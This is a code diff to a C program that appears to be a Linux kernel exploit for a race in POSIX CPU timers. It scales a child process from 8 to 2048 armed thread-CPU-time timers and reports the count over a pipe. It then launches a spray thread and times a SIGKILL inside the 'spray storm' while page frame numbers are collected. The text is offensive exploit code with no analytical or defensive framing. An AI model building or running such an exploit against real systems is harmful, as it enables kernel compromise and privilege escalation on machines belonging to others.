@@ -451,6 +451,8 @@ static int collect_pfns(const char *event, unsigned long long *out, int max)
     return count;
 }
 
+#define CHILD_TIMERS 2048
+
 static int concurrent_spray(int spray_delay_us, int kill_delay_us)
 {
     int pipefd[2];
@@ -481,6 +483,7 @@ static int concurrent_spray(int spray_delay_us, int kill_delay_us)
         struct itimerspec its;
         struct sigaction sa;
         int armed = 0;
+        static timer_t many[CHILD_TIMERS];
 
         close(pipefd[0]);
         memset(&sa, 0, sizeof(sa)); sa.sa_handler = handler_noop; sigaction(SIGRTMIN, &sa, NULL);
@@ -490,21 +493,29 @@ static int concurrent_spray(int spray_delay_us, int kill_delay_us)
         memset(&its, 0, sizeof(its));
         its.it_value.tv_nsec = 200000L;    /* 200 us of thread CPU */
         its.it_interval.tv_nsec = 200000L;
-        for (i = 0; i < 8; i++) {
-            if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &timers[i]) != 0) break;
-            if (timer_settime(timers[i], 0, &its, NULL) != 0) break;
+        for (i = 0; i < CHILD_TIMERS; i++) {
+            if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &many[i]) != 0) break;
+            if (timer_settime(many[i], 0, &its, NULL) != 0) break;
             armed++;
         }
+        (void)timers;
         c.fd = pipefd[1];
+        (void)!write(pipefd[1], &armed, sizeof(armed));   /* report how many armed */
         c.tid = (pid_t)syscall(SYS_gettid);
         if (pthread_create(&eth, NULL, (void *(*)(void *))exec_thread, &c) != 0) _exit(9);
         for (;;) pause();              /* parked: no one reaps us */
     }
 
     close(pipefd[1]);
-    if (read(pipefd[0], &tid, sizeof(tid)) != (ssize_t)sizeof(tid)) tid = 0;
-    close(pipefd[0]);
-    printf("child=%d exec_tid=%d\n", (int)child, (int)tid);
+    {
+        int armed_report = 0;
+        if (read(pipefd[0], &armed_report, sizeof(armed_report)) != (ssize_t)sizeof(armed_report)) {
+            armed_report = -1;
+        }
+        close(pipefd[0]);
+        printf("child=%d  timers_armed=%d\n", (int)child, armed_report);
+    }
+    (void)tid;
 
     /* start spraying, then land the SIGKILL inside the spray storm */
     if (pthread_create(&th, NULL, sprayer, &sc) != 0) return -1;
